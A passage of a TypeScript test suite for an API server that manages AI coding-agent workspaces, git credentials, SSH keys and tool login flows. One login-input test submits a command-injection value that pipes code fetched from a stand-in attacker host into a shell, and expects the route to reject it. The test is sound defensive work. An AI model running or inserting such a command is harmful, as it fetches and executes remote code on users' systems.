      // The CLI sends a prefix as typed; the route resolves the full id.
      const res = await client.workspace.restart.$post({
        json: {
          workspaceId: 'sess',
        },
      })
      expect(res.status).toBe(200)
      expect(res.headers.get('content-type')).toBe('application/x-ndjson')
      const events = (await res.text()).trim().split('\n').map((line) => JSON.parse(line) as unknown)
      expect(events).toEqual([
        { type: 'progress', message: 'Stopping session job yaac-demo-sess-x...' },
        { type: 'progress', message: 'Reusing existing workspace at /wt/sess-x' },
        {
          type: 'result',
          result: {
            workspaceId: 'sess-x',
            jobName: 'yaac-demo-sess-x',
            forwardedPorts: [],
            tool: 'claude',
            // The CLI reads this so it doesn't attach a PTY to an acp
            // workspace.
            mode: 'tui',
          },
        },
      ])
      expect(mockRestartSession).toHaveBeenCalledWith('sess-x', expect.objectContaining({
      }))
    })

    it('emits a terminal error event when restartWorkspace throws', async () => {
      await recordWorkspaceCreated({ projectSlug: 'demo', workspaceId: 'sess-y' })
      mockRestartSession.mockRejectedValue(new ServerError('INTERNAL', 'image pull failed'))
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.workspace.restart.$post({ json: { workspaceId: 'sess-y' } })
      expect(res.status).toBe(200)
      const events = (await res.text()).trim().split('\n').map((l) => JSON.parse(l) as unknown)
      expect(events).toEqual([
        { type: 'error', error: { code: 'INTERNAL', message: 'image pull failed' } },
      ])
    })

    it('answers 409 for a workspace already provisioning', async () => {
      await recordWorkspaceCreated({ projectSlug: 'demo', workspaceId: 'sess-z' })
      registerProvisioning({ workspaceId: 'sess-z', projectSlug: 'demo', tool: 'claude', kind: 'restart' })
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/restart', rawInit({
        method: 'POST', body: JSON.stringify({ workspaceId: 'sess-z' }),
      }))
      expect(res.status).toBe(409)
      expect(mockRestartSession).not.toHaveBeenCalled()
    })
  })

  describe('POST /workspace/stop', () => {
    it('rejects a missing workspaceId', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/stop', rawInit({
        method: 'POST',
        body: JSON.stringify({}),
      }))
      expect(res.status).toBe(400)
    })

    it('delegates to stopWorkspace and returns the result', async () => {
      mockDeleteSession.mockResolvedValue({
        workspaceId: 'sess-x',
        projectSlug: 'demo',
        jobName: 'yaac-demo-sess-x',
      })
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.workspace.stop.$post({ json: { workspaceId: 'sess-x' } })
      expect(res.status).toBe(200)
      expect(mockDeleteSession).toHaveBeenCalledWith('sess-x')
    })
  })

  describe('POST /workspace/mama on the relay listener', () => {
    // What the egress proxy sends for a k8s workspace pod: its own secret,
    // and the caller it resolved from the pod's source IP.
    const relay = async (bearer: string, workspaceId: string, body: string): Promise<Response> =>
      await buildMamaRelayApp((b) => Promise.resolve(b === 'proxy-secret')).request('/api/workspace/mama', {
        method: 'POST',
        headers: {
          'authorization': `Bearer ${bearer}`,
          'x-yaac-workspace-id': workspaceId,
          'content-type': 'application/json',
        },
        body,
      })

    it('runs the command for the workspace the proxy names', async () => {
      await recordWorkspaceCreated({ projectSlug: 'demo', workspaceId: 'sess-a' })
      const res = await relay('proxy-secret', 'sess-a', JSON.stringify({ command: 'rename', body: 'Relayed' }))
      expect(res.status).toBe(200)
      expect((await getProjectWorkspaceRows('demo')).get('sess-a')?.title).toBe('Relayed')

      // A refusal comes back as 422, like the containerless route's.
      const refused = await relay('proxy-secret', 'sess-a', JSON.stringify({ command: 'delete' }))
      expect(refused.status).toBe(422)
    })

    it('refuses a caller that is not the proxy, or a workspace that does not exist', async () => {
      await recordWorkspaceCreated({ projectSlug: 'demo', workspaceId: 'sess-a' })
      const body = JSON.stringify({ command: 'rename', body: 'Forged' })
      expect((await relay('guess', 'sess-a', body)).status).toBe(401)
      expect((await relay('proxy-secret', 'sess-gone', body)).status).toBe(401)
      expect((await getProjectWorkspaceRows('demo')).get('sess-a')?.title).not.toBe('Forged')
    })
  })

  // Sidebar groups through the routes. Changes must show on the snapshot,
  // and a stale group id must fail rather than file a workspace where
  // nothing lists it.
  describe('workspace group routes', () => {
    const client = (): ReturnType<typeof makeTestApiClient> =>
      makeTestApiClient(buildApp({ buildId: 'test' }))

    const seed = async (...workspaceIds: string[]): Promise<void> => {
      for (const workspaceId of workspaceIds) {
        await recordWorkspaceCreated({ projectSlug: 'demo', workspaceId })
      }
    }

    /** Create a group around `workspaceId` and hand back its new id. */
    const createGroup = async (workspaceId: string, name = 'Release'): Promise<string> => {
      const res = await client().workspace.group.create.$post({
        json: { projectSlug: 'demo', workspaceId, name },
      })
      expect(res.status).toBe(200)
      return (await res.json()).groupId
    }

    it('creates a group around a workspace and surfaces it for the snapshot', async () => {
      await seed('sess-a')
      const groupId = await createGroup('sess-a')

      expect(await listWorkspaceGroups('demo')).toEqual([expect.objectContaining({
        groupId, projectSlug: 'demo', name: 'Release', pinned: false,
      })])
      expect((await getProjectWorkspaceRows('demo')).get('sess-a')?.groupId).toBe(groupId)
    })

    it('renames, pins and deletes it, releasing its workspaces', async () => {
      await seed('sess-a')
      const groupId = await createGroup('sess-a')

      await client().workspace.group.rename.$post({ json: { projectSlug: 'demo', groupId, name: 'Shipping' } })
      await client().workspace.group['set-pinned'].$post({ json: { projectSlug: 'demo', groupId, pinned: true } })
      expect(await listWorkspaceGroups('demo')).toEqual([expect.objectContaining({
        name: 'Shipping', pinned: true,
      })])

      await client().workspace.group.delete.$post({ json: { projectSlug: 'demo', groupId } })
      expect(await listWorkspaceGroups('demo')).toEqual([])
      expect((await getProjectWorkspaceRows('demo')).get('sess-a')?.groupId).toBeUndefined()
    })

    it('moves a workspace in and out of a group, and 404s an unknown one', async () => {
      await seed('sess-a', 'sess-b')
      const groupId = await createGroup('sess-a')

      await client().workspace['set-group'].$post({
        json: { projectSlug: 'demo', workspaceId: 'sess-b', groupId },
      })
      expect((await getProjectWorkspaceRows('demo')).get('sess-b')?.groupId).toBe(groupId)

      await client().workspace['set-group'].$post({
        json: { projectSlug: 'demo', workspaceId: 'sess-b', groupId: null },
      })
      expect((await getProjectWorkspaceRows('demo')).get('sess-b')?.groupId).toBeUndefined()

      // A drop onto a group another client has already deleted.
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/set-group', rawInit({
        method: 'POST',
        body: JSON.stringify({ projectSlug: 'demo', workspaceId: 'sess-b', groupId: 'gone' }),
      }))
      expect(res.status).toBe(404)
    })

    it('404s a group created around a workspace that is not there', async () => {
      // Otherwise the group has no member, so the sidebar never shows it and
      // it can't be deleted.
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/group/create', rawInit({
        method: 'POST',
        body: JSON.stringify({ projectSlug: 'demo', workspaceId: 'nope', name: 'Release' }),
      }))
      expect(res.status).toBe(404)
      expect(await listWorkspaceGroups('demo')).toEqual([])
    })

    it('rejects a group name longer than the store keeps', async () => {
      // The store truncates to MAX_TITLE_LENGTH, so two long names with the
      // same prefix would become one group.
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/group/create', rawInit({
        method: 'POST',
        body: JSON.stringify({
          projectSlug: 'demo',
          workspaceId: 'sess-a',
          name: 'x'.repeat(MAX_TITLE_LENGTH + 1),
        }),
      }))
      expect(res.status).toBe(400)
      expect(await listWorkspaceGroups('demo')).toEqual([])
    })

    it('rejects a blank group name', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/workspace/group/create', rawInit({
        method: 'POST',
        body: JSON.stringify({ projectSlug: 'demo', workspaceId: 'sess-a', name: '' }),
      }))
      expect(res.status).toBe(400)
    })
  })

  // Queued workspaces through the routes (docs/queued-workspaces.md). Only
  // the create a launch runs is mocked.
  describe('queued workspace routes', () => {
    const client = (): ReturnType<typeof makeTestApiClient> =>
      makeTestApiClient(buildApp({ buildId: 'test' }))
    const post = (route: string, body: unknown): Promise<Response> =>
      Promise.resolve(buildApp({ buildId: 'test' }).request(`/api/workspace/queue/${route}`, rawInit({
        method: 'POST', body: JSON.stringify(body),
      })))

    beforeEach(async () => {
      await writeProject('demo')
      await recordWorkspaceCreated({ projectSlug: 'demo', workspaceId: 'parent', baseBranch: 'main', permissionMode: 'plan' })
    })

    it('queues, edits and runs one — once', async () => {
      const { groupId } = await (await client().workspace.group.create.$post({
        json: { projectSlug: 'demo', name: 'review' },
      })).json()
      const queued = await (await client().workspace.queue.create.$post({
        json: { project: 'demo', parent: 'parent', prompt: 'follow up', tool: 'claude', title: 'Named', group: 'review' },
      })).json()
      expect(queued).toMatchObject({
        parentWorkspaceId: 'parent', branch: 'main', permissionMode: 'plan', title: 'Named', groupId,
      })

      const edited = await (await client().workspace.queue.update.$post({
        json: { id: queued.id, prompt: 'follow up, edited' },
      })).json()
      expect(edited).toMatchObject({ prompt: 'follow up, edited', title: 'Named', groupId })
      // A group named but not yet made is created, as a create's is.
      const refiled = await (await client().workspace.queue.update.$post({
        json: { id: queued.id, group: 'fresh group' },
      })).json()
      expect(refiled.groupId).not.toBe(groupId)
      expect(await listWorkspaceGroups('demo')).toContainEqual(
        expect.objectContaining({ groupId: refiled.groupId, name: 'fresh group' }))

      // A launch still in flight: a second Run now loses the claim.
      let finish!: () => void
      // Records the workspace row like the real create; the launched entry
      // has a foreign key to it.
      mockCreateWorkspace.mockImplementation((slug, opts) => new Promise((resolve) => {
        finish = () => {
          void recordWorkspaceCreated({ projectSlug: slug, workspaceId: opts.workspaceId ?? 'x' }).then(() =>
            resolve({ workspaceId: opts.workspaceId ?? 'x', jobName: 'j', forwardedPorts: [], tool: 'claude', mode: 'tui' }))
        }
      }))
      const run = await client().workspace.queue.run.$post({ json: { id: queued.id } })
      expect(run.status).toBe(200)
      const { workspaceId } = await run.json()
      expect((await post('run', { id: queued.id })).status).toBe(409)
      expect((await post('discard', { id: queued.id })).status).toBe(409)

      await vi.waitFor(() => { expect(mockCreateWorkspace).toHaveBeenCalledTimes(1) })
      expect(mockCreateWorkspace.mock.calls[0][1]).toMatchObject({
        workspaceId,
        initialPrompt: 'follow up, edited',
        branch: 'main',
        permissionMode: 'plan',
        title: 'Named',
        groupId: refiled.groupId,
      })
      finish()
      // The entry became the workspace; there is nothing left to run.
      await vi.waitFor(async () => { expect(await getQueuedWorkspaceRow(queued.id)).toBeUndefined() })
      expect((await post('run', { id: queued.id })).status).toBe(404)
    })

    it('refuses a cycle in a chain, and splices a discarded link\'s children up', async () => {
      const queue = async (parent: string, prompt: string): Promise<string> =>
        (await (await client().workspace.queue.create.$post({
          json: { project: 'demo', parent, prompt },
        })).json()).id
      const top = await queue('parent', 'top')
      const middle = await queue(top, 'middle')
      const bottom = await queue(middle, 'bottom')

      expect((await post('update', { id: top, parent: bottom })).status).toBe(400)
      expect((await post('discard', { id: middle })).status).toBe(204)
      expect((await getQueuedWorkspaceRow(bottom))?.parentQueuedId).toBe(top)
      expect((await post('discard', { id: middle })).status).toBe(404)
      // An entry with no prompt would launch an agent nobody is watching.
      expect((await post('create', { project: 'demo', parent: 'parent', prompt: '' })).status).toBe(400)
    })
  })

  // Drafts through the routes (docs/draft-workspaces.md): a save without an
  // id makes one, with an id replaces it, and the snapshot carries them.
  describe('draft workspace routes', () => {
    const post = (route: string, body: unknown): Promise<Response> =>
      Promise.resolve(buildApp({ buildId: 'test' }).request(`/api/workspace/draft/${route}`, rawInit({
        method: 'POST', body: JSON.stringify(body),
      })))
    const settings = { prompt: 'someday', tool: 'claude', mode: 'tui', permissionMode: 'plan' }

    beforeEach(async () => { await writeProject('demo') })

    it('saves, replaces and discards a draft', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const saved = await (await client.workspace.draft.save.$post({
        json: { project: 'demo', prompt: 'someday', tool: 'codex', mode: 'acp', permissionMode: 'plan', branch: 'dev' },
      })).json()
      expect(saved).toMatchObject({ projectSlug: 'demo', tool: 'codex', mode: 'acp', branch: 'dev' })

      const replaced = await (await client.workspace.draft.save.$post({
        json: { id: saved.id, project: 'demo', prompt: 'someday', tool: 'claude', mode: 'tui', permissionMode: 'plan', startAfter: 'w1' },
      })).json()
      expect(replaced).toMatchObject({ id: saved.id, tool: 'claude', startAfter: 'w1' })
      expect(replaced).not.toHaveProperty('branch')
      expect((await listDraftWorkspaces()).map((d) => d.id)).toEqual([saved.id])

      expect((await post('discard', { id: saved.id })).status).toBe(204)
      expect((await post('discard', { id: saved.id })).status).toBe(404)
      // A draft that is gone is not silently re-created by a save naming it.
      expect((await post('save', { id: saved.id, project: 'demo', ...settings })).status).toBe(404)
      // An empty prompt has nothing to keep.
      expect((await post('save', { project: 'demo', ...settings, prompt: '' })).status).toBe(400)
      expect((await listDraftWorkspaces())).toEqual([])
    })

    // The draft is deleted only after the create succeeds, so a failed
    // create keeps the prompt.
    it('drops the draft a create or queue names, once it has succeeded', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const draft = async (): Promise<string> => (await (await client.workspace.draft.save.$post({
        json: { project: 'demo', prompt: 'someday', tool: 'claude', mode: 'tui', permissionMode: 'plan' },
      })).json()).id
      const ids = async (): Promise<string[]> => (await listDraftWorkspaces()).map((d) => d.id)

      const failed = await draft()
      mockCreateWorkspace.mockRejectedValueOnce(new ServerError('VALIDATION', 'no github token'))
      await (await client.workspace.create.$post({ json: { project: 'demo', draftId: failed } })).text()
      expect(await ids()).toEqual([failed])

      // An untitled create keeps the draft's generated title while the
      // prompt is unchanged.
      // While it runs, the draft is hidden and its provisioning row is
      // labelled with that title.
      await setDraftWorkspaceTitle(failed, 'someday', 'Someday')
      let finish!: () => void
      mockCreateWorkspace.mockImplementationOnce(() => new Promise((resolve) => {
        finish = () => resolve({ workspaceId: 'sess-x', jobName: 'j', forwardedPorts: [], tool: 'claude', mode: 'tui' })
      }))
      const created = client.workspace.create.$post({
        json: { project: 'demo', prompt: 'someday', draftId: failed },
      }).then((res) => res.text())
      await vi.waitFor(() => expect(mockCreateWorkspace).toHaveBeenCalledTimes(2))
      expect(await ids()).toEqual([])
      expect(listProvisioning().filter((p) => p.error === undefined)).toEqual([expect.objectContaining({ title: 'Someday' })])
      // A second run of the same draft is refused before it reserves a row.
      expect((await client.workspace.create.$post({ json: { project: 'demo', draftId: failed } })).status).toBe(409)
      expect(listProvisioning().filter((p) => p.error === undefined)).toHaveLength(1)
      finish()
      await created
      expect(await ids()).toEqual([])
      expect(mockCreateWorkspace.mock.lastCall?.[1]).toMatchObject({ title: 'Someday' })

      const queued = await draft()
      await setDraftWorkspaceTitle(queued, 'someday', 'Someday')
      expect((await client.workspace.queue.create.$post({
        json: { project: 'demo', parent: 'nope', prompt: 'p', draftId: queued },
      })).status).toBe(404)
      expect(await ids()).toEqual([queued])
      await recordWorkspaceCreated({ projectSlug: 'demo', workspaceId: 'parent', baseBranch: 'main', permissionMode: 'plan' })
      expect((await client.workspace.queue.create.$post({
        json: { project: 'demo', parent: 'parent', prompt: 'someday', draftId: queued },
      })).status).toBe(200)
      expect(await ids()).toEqual([])
      expect((await listQueuedWorkspaceRows('demo'))[0]).toMatchObject({ generatedTitle: 'Someday' })
      expect((await listQueuedWorkspaceRows('demo'))[0]).not.toHaveProperty('title')

      // An edited prompt leaves the draft's title behind.
      const edited = await draft()
      await setDraftWorkspaceTitle(edited, 'someday', 'Someday')
      await client.workspace.queue.create.$post({
        json: { project: 'demo', parent: 'parent', prompt: 'another day', draftId: edited },
      })
      expect((await listQueuedWorkspaceRows('demo'))[1]).not.toHaveProperty('generatedTitle')
    })
  })

  describe('POST /auth/clear', () => {
    it('rejects an unknown service', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/auth/clear', rawInit({
        method: 'POST',
        body: JSON.stringify({ service: 'mystery' }),
      }))
      expect(res.status).toBe(400)
    })

    it('clears claude credentials when service=claude', async () => {
      await saveClaudeOAuthBundle(SAMPLE_BUNDLE)
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.auth.clear.$post({ json: { service: 'claude' } })
      expect(res.status).toBe(204)
      expect(await loadClaudeCredentialsFile()).toBeNull()
    })
  })

  describe('POST /auth/git/credentials', () => {
    it('rejects a missing name or token', async () => {
      const app = buildApp({ buildId: 'test' })
      for (const body of [{ token: 'ghp_x' }, { name: 'gh' }, { name: 'gh', token: '' }]) {
        const res = await app.request('/api/auth/git/credentials', rawInit({
          method: 'POST', body: JSON.stringify(body),
        }))
        expect(res.status).toBe(400)
      }
    })

    it('stores a named token without pushing — no project uses it yet — and refuses a taken name', async () => {
      const synced = vi.spyOn(workspaceDriver(), 'syncCredentials').mockResolvedValue(undefined)
      try {
        const client = makeTestApiClient(buildApp({ buildId: 'test' }))
        const res = await client.auth.git.credentials.$post({ json: { name: 'gh', token: 'ghp_new' } })
        expect(res.status).toBe(200)
        const { id } = await res.json()
        expect(await listCredentialSummaries()).toEqual([
          { id, name: 'gh', kind: 'https', preview: '***_new', projects: [] },
        ])
        expect(synced).not.toHaveBeenCalled()

        const again = await client.auth.git.credentials.$post({ json: { name: 'gh', token: 'ghp_other' } })
        expect(again.status).toBe(409)
      } finally {
        synced.mockRestore()
      }
    })
  })

  describe('POST /auth/git/ssh-keys', () => {
    it('generates a named key, answers the public half, and leaves no private material behind', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.auth.git['ssh-keys'].$post({ json: { name: 'deploy' } })
      expect(res.status).toBe(200)
      const body = await res.json()
      expect(body).toEqual({
        id: expect.any(String) as string,
        publicKey: expect.stringMatching(/^ssh-ed25519 AAAAC3NzaC1lZDI1NTE5\S+ deploy$/) as string,
      })
      expect((await listCredentialSummaries())[0]).toMatchObject({ name: 'deploy', kind: 'ssh', publicKey: body.publicKey })
      // Nothing under the data dir's credentials holds anything about it.
      const credDir = path.join(tmpDir, 'server-local', '.credentials')
      for (const name of await fs.readdir(credDir).catch(() => [] as string[])) {
        expect(await fs.readFile(path.join(credDir, name), 'utf8')).not.toContain('ssh-ed25519')
      }
    })

    it('rejects a blank name', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.auth.git['ssh-keys'].$post({ json: { name: '  ' } })
      expect(res.status).toBe(400)
    })
  })

  describe('PATCH /auth/git/credentials/:id', () => {
    it('renames a credential, and 404s an unknown id', async () => {
      const { id } = await addHttpsCredential({ name: 'old', token: 'ghp_x' })
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.auth.git.credentials[':id'].$patch({ param: { id }, json: { name: 'new' } })
      expect(res.status).toBe(204)
      expect((await listCredentialSummaries()).map((c) => c.name)).toEqual(['new'])

      const missing = await client.auth.git.credentials[':id'].$patch({
        param: { id: '00000000-0000-4000-8000-000000000000' }, json: { name: 'x' },
      })
      expect(missing.status).toBe(404)
    })
  })

  describe('DELETE /auth/git/credentials/:id', () => {
    it('deletes a credential in use and takes it from the runtime at once', async () => {
      await recordProject({ slug: 'web', remoteUrl: 'https://github.com/acme/web', addedAt: 'now' })
      const a = await addHttpsCredential({ name: 'a', token: 'ghp_a' })
      await assignProjectCredential('web', a.id)
      const synced = vi.spyOn(workspaceDriver(), 'syncCredentials').mockResolvedValue(undefined)
      try {
        const client = makeTestApiClient(buildApp({ buildId: 'test' }))
        const res = await client.auth.git.credentials[':id'].$delete({ param: { id: a.id } })
        expect(res.status).toBe(204)
        expect(await listCredentialSummaries()).toEqual([])
        expect(synced.mock.calls.at(-1)?.[0].git).toEqual([])
      } finally {
        synced.mockRestore()
      }
    })

    it('deletes, but answers RUNTIME_UNAVAILABLE when the runtime could not be told', async () => {
      // Deleting is how a leaked credential is revoked, so success must not
      // be reported while the proxy still holds it.
      const { id } = await addHttpsCredential({ name: 'a', token: 'ghp_a' })
      const synced = vi.spyOn(workspaceDriver(), 'syncCredentials').mockRejectedValue(new Error('apiserver down'))
      try {
        const client = makeTestApiClient(buildApp({ buildId: 'test' }))
        const res = await client.auth.git.credentials[':id'].$delete({ param: { id } })
        expect(res.status).toBe(503)
        expect(await res.text()).toMatch(/deleted, but the egress proxy could not be updated.*apiserver down/)
        expect(await listCredentialSummaries()).toEqual([])
      } finally {
        synced.mockRestore()
      }
    })

    it('returns 404 for an unknown id, and 400 for a malformed one', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      expect((await client.auth.git.credentials[':id'].$delete({
        param: { id: '00000000-0000-4000-8000-000000000000' },
      })).status).toBe(404)
      expect((await client.auth.git.credentials[':id'].$delete({ param: { id: 'nope' } })).status).toBe(400)
    })
  })

  describe('POST /auth/git/credentials/:id/replace', () => {
    it('replaces the secret under the same name and projects, and pushes it', async () => {
      await recordProject({ slug: 'web', remoteUrl: 'https://github.com/acme/web', addedAt: 'now' })
      const { id } = await addHttpsCredential({ name: 'gh', token: 'ghp_leaked' })
      await assignProjectCredential('web', id)
      const synced = vi.spyOn(workspaceDriver(), 'syncCredentials').mockResolvedValue(undefined)
      try {
        const client = makeTestApiClient(buildApp({ buildId: 'test' }))
        const res = await client.auth.git.credentials[':id'].replace.$post({ param: { id }, json: { token: 'ghp_fresh' } })
        expect(res.status).toBe(200)
        const body = await res.json()
        expect(await listCredentialSummaries()).toEqual([
          { id: body.id, name: 'gh', kind: 'https', preview: '***resh', projects: ['web'] },
        ])
        expect(synced.mock.calls.at(-1)?.[0].git).toEqual([{ token: 'ghp_fresh', projects: ['web'] }])
      } finally {
        synced.mockRestore()
      }
    })
  })

  describe('PUT /project/:slug/git-credential', () => {
    it('assigns the credential and hands the runtime what the project may now use', async () => {
      await recordProject({ slug: 'web', remoteUrl: 'https://github.com/acme/web', addedAt: 'now' })
      const { id } = await addHttpsCredential({ name: 'gh', token: 'ghp_web' })
      const synced = vi.spyOn(workspaceDriver(), 'syncCredentials').mockResolvedValue(undefined)
      try {
        const client = makeTestApiClient(buildApp({ buildId: 'test' }))
        const res = await client.project[':slug']['git-credential'].$put({
          param: { slug: 'web' }, json: { credentialId: id },
        })
        expect(res.status).toBe(200)
        expect(await res.json()).toEqual({ knownHostsEntry: null })
        // The runtime injects from what it was last told, never from the store.
        expect(synced.mock.calls.at(-1)?.[0].git).toEqual([{ token: 'ghp_web', projects: ['web'] }])
      } finally {
        synced.mockRestore()
      }
    })

    it('404s an unknown project or credential', async () => {
      await recordProject({ slug: 'web', remoteUrl: 'https://github.com/acme/web', addedAt: 'now' })
      const { id } = await addHttpsCredential({ name: 'gh', token: 'ghp_web' })
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      expect((await client.project[':slug']['git-credential'].$put({
        param: { slug: 'nope' }, json: { credentialId: id },
      })).status).toBe(404)
      expect((await client.project[':slug']['git-credential'].$put({
        param: { slug: 'web' }, json: { credentialId: '00000000-0000-4000-8000-000000000000' },
      })).status).toBe(404)
    })
  })

  describe('PUT /auth/:tool', () => {
    it('persists a claude api-key payload', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.auth[':tool'].$put({
        param: { tool: 'claude' },
        json: { kind: 'api-key', apiKey: 'sk-ant-api03-new' },
      })
      expect(res.status).toBe(204)
      const entry = await loadClaudeCredentialsFile()
      expect(entry?.kind).toBe('api-key')
    })

    it('rejects an unknown tool', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/auth/gemini', rawInit({
        method: 'PUT',
        body: JSON.stringify({ kind: 'api-key', apiKey: 'x' }),
      }))
      expect(res.status).toBe(400)
    })

    it('rejects api-key payloads with empty apiKey', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.auth[':tool'].$put({
        param: { tool: 'claude' },
        json: { kind: 'api-key', apiKey: '' },
      })
      expect(res.status).toBe(400)
    })
  })

  describe('tool login routes', () => {
    let teardownAgent: () => void

    beforeEach(() => {
      teardownAgent = installLoopbackAgent()
      process.env.YAAC_E2E_CODEX_LOGIN_CLI = JSON.stringify([process.execPath, CODEX_STUB])
      process.env.YAAC_E2E_CLAUDE_LOGIN_CLI = JSON.stringify([process.execPath, CLAUDE_STUB])
    })

    afterEach(() => {
      teardownAgent()
      killAllToolLogins()
      delete process.env.YAAC_E2E_CODEX_LOGIN_CLI
      delete process.env.YAAC_E2E_CLAUDE_LOGIN_CLI
      delete process.env.FAKE_LOGIN_MODE
    })

    it('returns AUTH_AGENT_DISCONNECTED (503) when no auth server is connected', async () => {
      teardownAgent() // drop the loopback agent for this case
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const res = await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' } })
      expect(res.status).toBe(503)
      const body = await res.json() as unknown as { error: { code: string; message: string } }
      expect(body.error.code).toBe('AUTH_AGENT_DISCONNECTED')
      expect(body.error.message).toMatch(/yaac auth (update|server start)/)
      teardownAgent = installLoopbackAgent() // restore for afterEach symmetry
    })

    it('reports agent connectivity on GET /auth/agent', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const connectedRes = await client.auth.agent.$get()
      expect(await connectedRes.json()).toEqual({ connected: true })
      teardownAgent()
      const disconnectedRes = await client.auth.agent.$get()
      expect(await disconnectedRes.json()).toEqual({ connected: false })
      teardownAgent = installLoopbackAgent()
    })

    it('start → poll → success over the wire', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const startRes = await client.auth[':tool'].login.start.$post({ param: { tool: 'codex' } })
      if (!startRes.ok) throw new Error('login start failed')
      const started = await startRes.json()
      expect(started.tool).toBe('codex')

      await vi.waitFor(async () => {
        const res = await client.auth.login[':id'].$get({ param: { id: started.id } })
        expect(res.status).toBe(200)
        expect((await res.json()).status).toBe('success')
      }, { timeout: 10_000, interval: 50 })
    })

    it('rejects starting a login for opencode', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/auth/opencode/login/start', rawInit({ method: 'POST' }))
      expect(res.status).toBe(400)
    })

    it('rejects non-code input as VALIDATION through the route', async () => {
      process.env.FAKE_LOGIN_MODE = 'need-input'
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const startRes = await client.auth[':tool'].login.start.$post({ param: { tool: 'claude' } })
      if (!startRes.ok) throw new Error('login start failed')
      const started = await startRes.json()

      const res = await client.auth.login[':id'].input.$post({
        param: { id: started.id },
        json: { text: '$(curl evil.sh | sh)' },
      })
      expect(res.status).toBe(400)
      const body = await res.json() as unknown as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })

    it('404s polling or feeding input to an unknown session; cancel is a no-op 204', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const get = await client.auth.login[':id'].$get({ param: { id: 'nope' } })
      expect(get.status).toBe(404)
      const input = await client.auth.login[':id'].input.$post({ param: { id: 'nope' }, json: { text: 'x' } })
      expect(input.status).toBe(404)
      const cancel = await client.auth.login[':id'].cancel.$post({ param: { id: 'nope' } })
      expect(cancel.status).toBe(204)
    })
  })

  describe('tool install routes', () => {
    let teardownAgent: () => void

    beforeEach(() => {
      teardownAgent = installLoopbackAgent()
      process.env.YAAC_E2E_CLAUDE_INSTALL_CLI = JSON.stringify([process.execPath, INSTALL_STUB])
    })

    afterEach(() => {
      teardownAgent()
      killAllToolInstalls()
      delete process.env.YAAC_E2E_CLAUDE_INSTALL_CLI
    })

    it('start → poll → success over the wire', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const startRes = await client.auth[':tool'].install.start.$post({ param: { tool: 'claude' } })
      if (!startRes.ok) throw new Error('install start failed')
      const started = await startRes.json()
      expect(started.tool).toBe('claude')

      await vi.waitFor(async () => {
        const res = await client.auth.install[':id'].$get({ param: { id: started.id } })
        expect(res.status).toBe(200)
        expect((await res.json()).status).toBe('success')
      }, { timeout: 10_000, interval: 50 })
    })

    it('rejects starting an install for opencode', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/auth/opencode/install/start', rawInit({ method: 'POST' }))
      expect(res.status).toBe(400)
    })

    it('404s polling an unknown install; cancel is a no-op 204', async () => {
      const client = makeTestApiClient(buildApp({ buildId: 'test' }))
      const get = await client.auth.install[':id'].$get({ param: { id: 'nope' } })
      expect(get.status).toBe(404)
      const cancel = await client.auth.install[':id'].cancel.$post({ param: { id: 'nope' } })
      expect(cancel.status).toBe(204)
    })
  })

  describe('body parsing', () => {
    it('malformed JSON maps to VALIDATION 400', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/project/add', rawInit({
        method: 'POST',
        body: '{not-json',
      }))
      expect(res.status).toBe(400)
      const body = await res.json() as { error: { code: string } }
      expect(body.error.code).toBe('VALIDATION')
    })

    it('array body is rejected as VALIDATION', async () => {
      const app = buildApp({ buildId: 'test' })
      const res = await app.request('/api/project/add', rawInit({
        method: 'POST',
        body: JSON.stringify([]),
      }))
      expect(res.status).toBe(400)
    })
  })

  it('write routes do not touch state before invocation', async () => {
    expect(await fs.readdir(getProjectsDir()).catch(() => [])).toEqual([])
    expect(projectDir('never')).toContain('never')
    expect(claudeDir('never')).toContain('claude')
    expect(codexDir('never')).toContain('codex')
  })
})
